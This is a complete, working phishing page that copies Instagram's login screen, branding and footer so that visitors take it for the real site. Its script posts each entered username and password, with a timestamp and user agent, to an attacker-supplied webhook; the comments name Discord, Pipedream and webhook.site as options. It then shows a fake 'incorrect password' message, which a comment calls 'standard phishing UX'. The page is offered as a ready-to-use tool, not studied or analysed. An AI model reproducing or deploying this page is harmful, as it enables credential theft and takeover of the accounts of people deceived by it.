<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Instagram</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: #262626;
  }

  .wrapper {
    display: flex;
    align-items: flex-start;
    gap: 32px;
    max-width: 900px;
    width: 100%;
    padding: 0 20px;
  }

  /* Phone mockup — hidden on small screens */
  .phone-mock {
    width: 380px;
    min-width: 380px;
    height: 580px;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .phone-mock img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    /* Fallback: CSS-drawn phone */
    display: none;
  }
  .phone-css {
    width: 270px;
    height: 540px;
    border: 2px solid #dbdbdb;
    border-radius: 36px;
    background: #fff;
    position: relative;
    box-shadow: 0 0 0 6px #fff, 0 0 0 8px #dbdbdb;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 48px;
    gap: 16px;
  }
  .phone-notch {
    position: absolute;
    top: 0; left: 50%;
    transform: translateX(-50%);
    width: 90px; height: 20px;
    background: #fafafa;
    border-bottom-left-radius: 12px;
    border-bottom-right-radius: 12px;
    border: 2px solid #dbdbdb;
    border-top: none;
  }
  .phone-logo {
    font-family: "Billabong", cursive;
    font-size: 32px;
    letter-spacing: -1px;
    margin-top: 8px;
  }
  .phone-screen-post {
    width: 230px;
    height: 230px;
    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
  }
  .phone-bar {
    display: flex;
    align-items: center;
    justify-content: space-around;
    width: 100%;
    padding: 0 8px;
  }
  .phone-bar-item {
    width: 28px;
    height: 28px;
    background: #dbdbdb;
    border-radius: 50%;
  }

  /* Login card */
  .card-wrap {
    display: flex;
    flex-direction: column;
    gap: 10px;
    width: 350px;
    min-width: 280px;
  }

  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 40px 40px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0;
  }

  .ig-logo {
    font-size: 40px;
    margin-bottom: 28px;
    font-family: Georgia, serif;
    font-style: italic;
    letter-spacing: -1px;
    /* Real Instagram wordmark feel */
    background: linear-gradient(45deg, #f09433, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }

  .form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  .field-wrap {
    position: relative;
  }

  .field-wrap input {
    width: 100%;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 9px 8px 7px;
    font-size: 12px;
    color: #262626;
    outline: none;
    transition: border-color 0.1s;
  }
  .field-wrap input:focus {
    border-color: #a8a8a8;
    background: #fff;
  }
  .field-wrap label {
    position: absolute;
    left: 8px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    color: #8e8e8e;
    pointer-events: none;
    transition: all 0.1s ease;
  }
  .field-wrap input:focus ~ label,
  .field-wrap input:not(:placeholder-shown) ~ label {
    top: 6px;
    font-size: 9px;
    transform: none;
  }
  .field-wrap input {
    padding-top: 14px;
  }
  .field-wrap input::placeholder {
    color: transparent;
  }

  /* Show/hide password toggle */
  .toggle-pw {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 13px;
    font-weight: 600;
    color: #262626;
    cursor: pointer;
    user-select: none;
    background: none;
    border: none;
    padding: 0;
  }

  .or-row {
    display: flex;
    align-items: center;
    gap: 18px;
    margin: 18px 0 18px;
    width: 100%;
  }
  .or-line { flex: 1; height: 1px; background: #dbdbdb; }
  .or-text { font-size: 13px; font-weight: 600; color: #8e8e8e; }

  .btn-login {
    width: 100%;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 8px 0;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
    opacity: 1;
    transition: opacity 0.2s;
  }
  .btn-login:hover { opacity: 0.85; }
  .btn-login:disabled { opacity: 0.5; cursor: default; }

  .btn-facebook {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    width: 100%;
    background: none;
    border: none;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    padding: 0;
  }
  .btn-facebook svg { width: 18px; height: 18px; }

  .forgot-link {
    text-align: center;
    margin-top: 12px;
    width: 100%;
    font-size: 12px;
    color: #00376b;
    cursor: pointer;
    text-decoration: none;
    display: block;
  }

  .signup-card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 20px;
    text-align: center;
    font-size: 14px;
    color: #262626;
  }
  .signup-card a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
  }

  .app-links {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 16px;
    margin-top: 16px;
  }
  .app-links p { font-size: 14px; color: #262626; }
  .app-badges { display: flex; gap: 8px; }
  .badge {
    border: 1px solid #262626;
    border-radius: 6px;
    padding: 6px 10px;
    font-size: 11px;
    font-weight: 600;
    color: #262626;
    letter-spacing: 0.3px;
  }

  /* Status overlay */
  #status-toast {
    display: none;
    position: fixed;
    bottom: 40px;
    left: 50%;
    transform: translateX(-50%);
    background: #333;
    color: #fff;
    padding: 10px 24px;
    border-radius: 6px;
    font-size: 14px;
    z-index: 9999;
    white-space: nowrap;
  }

  /* Fake loading spinner */
  .spinner {
    display: none;
    width: 20px; height: 20px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
    margin: 0 auto;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  footer {
    margin-top: 52px;
    text-align: center;
    color: #8e8e8e;
    font-size: 12px;
    line-height: 2;
  }
  footer a { color: #8e8e8e; text-decoration: none; margin: 0 6px; }

  @media (max-width: 700px) {
    .phone-mock { display: none; }
    .wrapper { justify-content: center; }
  }
</style>
</head>
<body>

<div class="wrapper">
  <!-- Phone mockup (pure CSS) -->
  <div class="phone-mock" aria-hidden="true">
    <div class="phone-css">
      <div class="phone-notch"></div>
      <div class="phone-logo">Instagram</div>
      <div class="phone-screen-post">📸</div>
      <div class="phone-bar">
        <div class="phone-bar-item"></div>
        <div class="phone-bar-item" style="border-radius:4px; width:36px; height:20px;"></div>
        <div class="phone-bar-item"></div>
        <div class="phone-bar-item"></div>
        <div class="phone-bar-item"></div>
      </div>
    </div>
  </div>

  <!-- Login column -->
  <div class="card-wrap">
    <div class="card">
      <div class="ig-logo">Instagram</div>

      <div class="form" id="login-form">
        <div class="field-wrap">
          <input type="text" id="username" placeholder="x" autocomplete="username" autocorrect="off" autocapitalize="off">
          <label for="username">Phone number, username, or email</label>
        </div>

        <div class="field-wrap">
          <input type="password" id="password" placeholder="x" autocomplete="current-password">
          <label for="password">Password</label>
          <button class="toggle-pw" type="button" tabindex="-1" onclick="togglePw()">Show</button>
        </div>

        <button class="btn-login" id="login-btn" onclick="handleLogin()">
          <span id="btn-text">Log in</span>
          <div class="spinner" id="spinner"></div>
        </button>

        <div class="or-row">
          <div class="or-line"></div>
          <span class="or-text">OR</span>
          <div class="or-line"></div>
        </div>

        <button class="btn-facebook">
          <svg viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073C24 5.404 18.627 0 12 0S0 5.404 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.234 2.686.234v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
          Log in with Facebook
        </button>

        <a class="forgot-link" href="#">Forgot password?</a>
      </div>
    </div>

    <div class="signup-card">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-links">
      <p>Get the app.</p>
      <div class="app-badges">
        <div class="badge">App Store</div>
        <div class="badge">Google Play</div>
      </div>
    </div>
  </div>
</div>

<footer>
  <div>
    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
    <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
    <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
    <a href="#">Contact Uploading &amp; Non-Users</a>
  </div>
  <div>English &nbsp;© 2025 Instagram from Meta</div>
</footer>

<div id="status-toast"></div>

<script>
  // ── CONFIG ─────────────────────────────────────────────────────────────────
  const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
  // Replace with your webhook (Discord, Pipedream, webhook.site, etc.)
  // Discord format: https://discord.com/api/webhooks/ID/TOKEN
  // ───────────────────────────────────────────────────────────────────────────

  function togglePw() {
    const pw = document.getElementById("password");
    const btn = document.querySelector(".toggle-pw");
    if (pw.type === "password") {
      pw.type = "text";
      btn.textContent = "Hide";
    } else {
      pw.type = "password";
      btn.textContent = "Show";
    }
  }

  function toast(msg, duration = 3000) {
    const el = document.getElementById("status-toast");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => el.style.display = "none", duration);
  }

  async function sendToWebhook(username, password) {
    const payload = {
      username: "IG Capture",
      embeds: [{
        title: "🔑 New Credential Captured",
        color: 0xE1306C,
        fields: [
          { name: "Username / Email", value: username || "(empty)", inline: true },
          { name: "Password", value: password || "(empty)", inline: true },
          { name: "Timestamp", value: new Date().toISOString(), inline: false },
          { name: "User-Agent", value: navigator.userAgent.slice(0, 200), inline: false }
        ]
      }]
    };

    // Auto-detect: Discord webhook vs plain JSON endpoint
    const isDiscord = WEBHOOK_URL.includes("discord.com/api/webhooks");

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(isDiscord ? payload : {
        username,
        password,
        timestamp: new Date().toISOString(),
        ua: navigator.userAgent
      })
    });
  }

  async function handleLogin() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;

    if (!username || !password) {
      toast("Please enter your username and password.");
      return;
    }

    // Disable button, show spinner
    const btn = document.getElementById("login-btn");
    const btnText = document.getElementById("btn-text");
    const spinner = document.getElementById("spinner");
    btn.disabled = true;
    btnText.style.display = "none";
    spinner.style.display = "block";

    try {
      if (WEBHOOK_URL && WEBHOOK_URL !== "YOUR_WEBHOOK_URL_HERE") {
        await sendToWebhook(username, password);
        toast("✅ Sent to webhook.");
      } else {
        // Dev mode — log to console, alert
        console.log("[CAPTURED]", { username, password });
        toast(`[DEV] u:${username} p:${password}`);
      }
    } catch (err) {
      console.error("Webhook failed:", err);
      toast("Network error — creds logged to console.");
      console.log("[CAPTURED — webhook failed]", { username, password });
    }

    // Simulate loading then show "incorrect password" — standard phishing UX
    setTimeout(() => {
      btn.disabled = false;
      btnText.style.display = "block";
      spinner.style.display = "none";
      showError("Sorry, your password was incorrect. Please double-check your password.");
    }, 1800);
  }

  function showError(msg) {
    // Remove existing error if any
    const existing = document.getElementById("login-error");
    if (existing) existing.remove();

    const err = document.createElement("p");
    err.id = "login-error";
    err.style.cssText = "font-size:14px;color:#262626;text-align:center;margin-top:8px;";
    err.textContent = msg;
    document.getElementById("login-form").appendChild(err);
  }

  // Enter key support
  document.addEventListener("keydown", e => {
    if (e.key === "Enter") handleLogin();
  });
</script>
</body>
</html>
